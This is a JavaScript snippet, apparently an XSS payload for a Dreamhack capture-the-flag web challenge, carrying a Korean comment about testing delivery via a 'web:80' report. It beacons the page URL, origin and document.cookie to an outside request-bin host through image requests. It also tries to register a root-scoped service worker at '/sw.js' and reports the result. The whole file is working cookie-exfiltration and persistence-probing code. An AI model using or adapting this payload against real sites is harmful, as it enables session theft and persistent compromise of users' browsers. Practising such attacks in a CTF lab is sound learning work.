  (() => {
    const BIN = "https://lnbuyrp.request.dreamhack.games";
    const ID = "swtest_" + Date.now() + "_" + Math.random().toString(16).slice(2);

    const send = (k, v) => {
      const url = `${BIN}/?id=${encodeURIComponent(ID)}&${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`;
      new Image().src = url;
    };

    send("phase", "start");
    send("href", location.href);
    send("origin", location.origin);
    send("secure", self.isSecureContext);
    send("sw_type", typeof navigator.serviceWorker);
    send("sw_in_nav", "serviceWorker" in navigator);

    // 2) http://web:80 리포트로 들어왔을 때 임의 값 전송 확인
    send("marker", "HELLO_WEB80_TEST");
    send("cookie", document.cookie);

    if ("serviceWorker" in navigator) {
      send("sw_controller_before", !!navigator.serviceWorker.controller);

      navigator.serviceWorker.register("/sw.js", { scope: "/" })
        .then((reg) => {
          send("sw_register", "ok");
          send("sw_scope", reg.scope);
        })
        .catch((e) => {
          send("sw_register", "fail");
          send("sw_error_name", e && e.name ? e.name : "unknown");
          send("sw_error_msg", e && e.message ? e.message : "no_message");
        });
    }

    setTimeout(() => send("phase", "end"), 1500);
  })();
